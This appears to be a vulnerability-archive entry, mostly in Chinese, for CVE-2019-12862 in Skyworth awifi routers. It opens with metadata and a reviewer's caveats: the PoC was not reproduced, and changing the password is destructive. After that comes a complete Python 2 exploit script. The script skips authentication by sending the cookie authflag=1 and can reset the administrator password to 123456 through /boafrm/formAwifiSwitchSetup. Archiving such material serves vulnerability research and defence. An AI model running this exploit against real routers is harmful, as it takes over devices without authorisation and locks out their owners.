---
cve: "CVE-2019-12862"
source: "Mr-xn/Penetration_Testing_POC"
id: "vw-e26770fd6de5f651be647f92"
entity_id: "ve-e26770fd6de5f651be647f92"
schema_version: "1"
title: "天翼创维awifi路由器存在多处未授权访问漏洞"
product: "Skyworth天翼awifi路由器"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2019-12862"
referenced_identifiers: ""
prerequisites: "Cookie authflag=1，型号固件未知；Python2"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%A4%A9%E7%BF%BC%E5%88%9B%E7%BB%B4/%E5%A4%A9%E7%BF%BC%E5%88%9B%E7%BB%B4awifi%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%A4%9A%E5%A4%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "账户操作会新增用户或更改认证材料，可能使原用户失去访问；须核对角色、操作前账户状态及恢复路径"
source_status: "unknown"
---

# 天翼创维awifi路由器存在多处未授权访问漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Skyworth天翼awifi路由器
- 本文讨论：CVE-2019-12862 authflag信任及改密
- 版本、权限与配置前提：Cookie authflag=1，型号固件未知；Python2
- 资料类型：Cookie绕过/改密脚本；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 版本Boa0.94.14rc21是Web服务器版本非设备固件
- home.htm有title.htm不证明后台权限，改密restartNow匹配也应配后续验证
- PDF仅相对引用未读；POC截图标题后完全空白而非sparse缺图
- 改密123456是破坏性账户变更，不应当普通无副作用扫描

### 操作风险与恢复

- 账户操作会新增用户或更改认证材料，可能使原用户失去访问；须核对角色、操作前账户状态及恢复路径

### 待核与来源

- PDF仓库资源存在性/内容、CVE版本与认证边界待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|天翼创维awifi路由器存在多处未授权访问漏洞|2019-06-01|H4lo|[http://www.skyworth.com/](http://www.skyworth.com/)|[http://www.skyworth.com/](http://www.skyworth.com/)|Boa/0.94.14rc21|[CVE-2019-12862](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12862)|

### 漏洞详情PDF：[详情](POC_Details/1.天翼创维awifi路由器存在多处未授权访问漏洞.pdf)

### POC实现代码如下：  

``` python
#coding: utf-8
#__author__: H4lo
import requests
import sys


payload = "authflag=1"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36"
headers = {
    "User-Agent": UA,
    "Cookie": payload
}

def exp(ip):
    info = """1. Login with no password\n2. Change administrator's password\n"""
    print info
    op = int(raw_input("Enter the options:"))
    if op == 1:
        url = "http://" + str(ip)+"/home.htm"
        try:
            res = requests.get(url,headers=headers,timeout=5)
            if "title.htm" in res.text:
                print "[+] The router is vulnerable"
            else:
                print "[-] The router is not vulnerable"
        except Exception as e:
            print str(e)
            
    elif(op == 2):
        url = "http://" + str(ip) + "/boafrm/formAwifiSwitchSetup"
        data = {
            "olduserpass":"1",
            "newpass":"123456",
            "confirmnewpass":"123456",
            "submit-url":"/password.htm"
        }
        try:
            res = requests.post(url=url,headers=headers,data=data,timeout=5)
            if "restartNow" in res.text:
                print "[+] Password had be changed to 123456"
            else:
                print "[-] Some error!"
        except Exception as e:
            print str(e)
            
    else:
        print "error options!"
if __name__ == '__main__':
    ip = sys.argv[1]
    exp(ip)
```

---

### POC截图效果如下：


---

> 来源：Mr-xn/Penetration_Testing_POC
